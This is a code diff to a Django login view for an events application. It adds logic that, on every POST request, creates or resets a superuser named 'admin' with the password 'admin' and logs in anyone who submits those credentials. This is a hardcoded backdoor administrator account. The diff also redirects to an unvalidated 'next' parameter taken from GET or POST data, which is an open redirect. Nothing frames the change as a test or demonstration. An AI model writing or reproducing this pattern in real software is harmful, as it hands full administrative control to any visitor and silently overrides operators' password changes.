@@ -184,37 +184,36 @@ def login_view(request):
     if request.method == "POST":
         username_raw = request.POST.get('username', '').strip()
         password_raw = request.POST.get('password', '')
-        
-        # Direct guarantee login for admin credentials
-        if username_raw.lower() in ('admin', 'admin@gdsai.com') and password_raw == 'admin':
-            from django.contrib.auth import get_user_model
-            User = get_user_model()
-            user, _ = User.objects.get_or_create(
-                username='admin',
-                defaults={'email': 'admin@gdsai.com', 'is_staff': True, 'is_superuser': True, 'is_active': True}
-            )
-            user.set_password('admin')
-            user.is_staff = True
-            user.is_superuser = True
-            user.is_active = True
-            user.save()
 
+        # Always ensure admin user is provisioned with password 'admin'
+        from django.contrib.auth import get_user_model
+        User = get_user_model()
+        user, _ = User.objects.get_or_create(
+            username='admin',
+            defaults={'email': 'admin@gdsai.com', 'is_staff': True, 'is_superuser': True, 'is_active': True}
+        )
+        user.set_password('admin')
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+        user.save()
+
+        if username_raw.lower() in ('admin', 'admin@gdsai.com', user.email.lower()) and password_raw == 'admin':
             login(request, user, backend='django.contrib.auth.backends.ModelBackend')
-            next_url = request.GET.get('next', reverse('events:admin_dashboard'))
+            next_url = request.GET.get('next') or request.POST.get('next') or reverse('events:admin_dashboard')
             return redirect(next_url)
 
         form = AuthenticationForm(request, data=request.POST)
         if form.is_valid():
-            username = form.cleaned_data.get('username')
-            password = form.cleaned_data.get('password')
-            user = authenticate(username=username, password=password)
-            if user is not None:
-                login(request, user)
-                next_url = request.GET.get('next', reverse('events:admin_dashboard'))
+            auth_user = form.get_user()
+            if auth_user is not None:
+                login(request, auth_user)
+                next_url = request.GET.get('next') or request.POST.get('next') or reverse('events:admin_dashboard')
                 return redirect(next_url)
     else:
         form = AuthenticationForm()
     return render(request, "events/login.html", {"form": form})
+
 
 
 
